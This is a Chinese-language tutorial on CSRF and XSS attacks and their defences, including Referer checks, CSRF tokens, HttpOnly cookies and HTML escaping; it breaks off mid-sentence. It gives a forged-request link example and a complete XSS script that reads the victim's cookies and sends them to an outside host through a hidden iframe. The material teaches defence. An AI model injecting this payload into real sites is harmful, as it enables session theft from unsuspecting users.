# CSRF攻击
CSRF(Cross-site request forgery) 中文翻译为跨站请求伪造
CSRF是指在用户不知情的情况下，冒充用户发起请求。
例如，一论坛网站的发贴是通过 GET 请求访问，点击发贴之后 JS 把发贴内容拼接成目标 URL 并访问：
```
  http://example.com/bbs/create_article?title=标题&content=内容
```
那么，我们只需要在论坛中发一帖，包含一链接：
```
 http://example.com/bbs/create_article?title=我是脑残&content=哈哈
```
只要有用户点击了这个链接，那么他们的帐户就会在不知情的情况下发布了这一帖子。但是既然发贴的请求可以伪造，那么删帖、转帐、改密码、发邮件全都可以伪造。所以这就是在用户不知情的情况下，伪造用户请求，完成一些违背用户意愿的请求。

## 防范CSRF攻击
### 关键操作只接受POST请求 
因为GET请求会把参数暴露在URL之中，这样通过修改URL的参数就能完成一些请求，这是非常不安全的。
### 检测 Referer

根据HTTP协议，在HTTP头中有一个字段叫Referer，它记录了该HTTP请求的来源地址。在通常情况下，访问一个安全受限页面的请求必须来自于同一个网站。比如某银行的转账是通过用户访问http://bank.test/test?page=10&userID=101&money=10页面完成，用户必须先登录http://bank.test，然后通过点击页面上的按钮来触发转账事件。当用户提交请求时，该转账请求的Referer值就会是转账按钮所在页面的URL（本例中，通常是以bank. test域名开头的地址）。而如果攻击者要对银行网站实施CSRF攻击，他只能在自己的网站构造请求，当用户通过攻击者的网站发送请求到银行时，该请求的Referer是指向攻击者的网站。因此，要防御CSRF攻击，银行网站只需要对于每一个转账请求验证其Referer值，如果是以bank. test开头的域名，则说明该请求是来自银行网站自己的请求，是合法的。如果Referer是其他网站的话，就有可能是CSRF攻击，则拒绝该请求。

### 使用Token
 1.在请求地址中添加token并验证
CSRF攻击之所以能够成功，是因为攻击者可以伪造用户的请求，该请求中所有的用户验证信息都存在于Cookie中，因此攻击者可以在不知道这些验证信息的情况下直接利用用户自己的Cookie来通过安全验证。由此可知，抵御CSRF攻击的关键在于：在请求中放入攻击者所不能伪造的信息，并且该信息不存在于Cookie之中。鉴于此，系统开发者可以在HTTP请求中以参数的形式加入一个随机产生的token，并在服务器端建立一个拦截器来验证这个token，如果请求中没有token或者token内容不正确，则认为可能是CSRF攻击而拒绝该请求。

2.在HTTP头中自定义属性并验证
自定义属性的方法也是使用token并进行验证，和前一种方法不同的是，这里并不是把token以参数的形式置于HTTP请求之中，而是把它放到HTTP头中自定义的属性里。通过XMLHttpRequest这个类，可以一次性给所有该类请求加上csrftoken这个HTTP头属性，并把token值放入其中。这样解决了前一种方法在请求中加入token的不便，同时，通过这个类请求的地址不会被记录到浏览器的地址栏，也不用担心token会通过Referer泄露到其他网站。

Token 使用原则
Token 要足够随机————只有这样才算不可预测
Token 是一次性的，即每次请求成功后要更新Token————这样可以增加攻击难度，增加预测难度
Token 要注意保密性————敏感操作使用 post，防止 Token 出现在 URL 中
# XSS攻击
XSS是跨站脚本攻击。指的是向网站注入一段代码，当其他用户访问这个网站时，会运行这个脚本，从而造成信息泄露等。

例如：
```
<script type="text/javascript"> 
(function(window, document) {
    // 构造泄露信息用的 URL
    var cookies = document.cookie;
    var xssURIBase = "http://192.168.123.123/myxss/";
    var xssURI = xssURIBase + window.encodeURI(cookies);
    // 建立隐藏 iframe 用于通讯
    var hideFrame = document.createElement("iframe");
    hideFrame.height = 0;
    hideFrame.width = 0;
    hideFrame.style.display = "none";
    hideFrame.src = xssURI;
    // 开工
    document.body.appendChild(hideFrame);
})(window, document);
</script>
```
在评论中插入这段代码，
 **此段代码就可以携带着用户的cookie信息传输给了http://192.168.123.123/myxss/...这段服务器，然后服务器的代码就可以接收到了用户的隐私消息，继而继续做其他的业务处理（myxss/index.php 中写一些可怕的代码，如把用户信息存进自己的数据库）。**
## 防范XSS攻击
### 使用HttpOnly提升Cookie安全性
通过设置Cookie的HttpOnly属性为true，是攻击者不能通过客户端脚本访问
### 对用户的输入进行 HTML escape（转义）

如果不需要用户输入 HTML，可以直接对用户的输入进行 HTML escape 。下面一小段脚本：
```
  <script>window.location.href=”http://www.baidu.com”;</script>
```
经过 escape 之后就成了：

  ```
&lt;script&gt;window.location.href=&quot;http://www.baidu.com&quot;&lt;/script&gt;
```
它现在会像普通文本一样显示出来，变得无毒无害，不能执行了。
### 对用户输入进行验证
比如说对输入限定一定的长度，或者验证
